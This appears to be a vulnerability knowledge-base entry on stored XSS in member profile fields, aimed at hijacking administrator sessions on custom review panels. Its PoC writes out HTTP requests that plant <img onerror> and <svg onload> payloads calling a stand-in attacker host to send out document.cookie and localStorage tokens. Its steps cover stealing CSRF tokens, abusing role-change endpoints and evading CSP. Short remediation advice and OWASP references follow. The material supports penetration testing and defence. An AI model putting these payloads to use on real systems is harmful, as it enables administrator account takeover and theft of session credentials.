---
title: Stored XSS in member profiles targeting admin review (administrator session hijacking)
cve: None (implementation flaw)
severity: high
cvss: 8.2
product: Custom admin panels (support/review/risk-control pages)
versions: Any
ports: 80, 443
keywords: stored xss, stored, admin panel, review, cookie, csrf
entry: Insert <img onerror> into nicknames/notes/tickets
verified: false
sources: Compiled from public sources (implementation flaws; no CVE)
---

## Fingerprints

- Member-controlled fields appear in admin lists/details: nickname, real name, notes, ticket content, deposit-receipt filename, agent promotional text.
- Admin pages have no CSP, or their CSP allows inline scripts.

## Prerequisites

- An ordinary account; knowledge of manual admin review actions (withdrawal review, identity verification, ticket replies).

## PoC

```http
### 1) Write the payload into a nickname/note
POST /api/user/update HTTP/1.1
Content-Type: application/json

{"nickname":"<img src=x onerror=fetch('//attacker/c?'+document.cookie)>"}

### 2) Tickets/messages (more likely to be opened by support)
POST /api/support/ticket HTTP/1.1

{"title":"<svg onload=fetch('//attacker/c?'+localStorage.token)>","content":"hi"}
```

## Exploitation Steps

1. Insert payloads containing `onerror`/`onload` into each field in turn, recording which page displays each one.
2. Confirm opening through your own separate "admin view" (if a test admin panel exists), or by observing support response timing.
3. After success, steal `document.cookie`, `localStorage.token`, and admin-page CSRF tokens, then use them against "approve review/change role" endpoints.
4. Without a reverse connection, use DOM-based exfiltration (`new Image().src`) or `fetch` with Referer; under strict CSP, look for same-origin JSONP/upload points.
5. Evidence: payload field + admin-page screenshot/reverse-connection logs; target only your own review requests.

## Remediation and Mitigation

- Context-sensitive output encoding + rich-text allowlists; CSP `default-src 'self'` with inline scripts prohibited.
- Set `HttpOnly` + `SameSite=Strict` on admin cookies; require secondary verification for sensitive operations.
- Render user content as plain text on review pages.

## References

- OWASP XSS Prevention Cheat Sheet; OWASP WSTG-INPV-02.
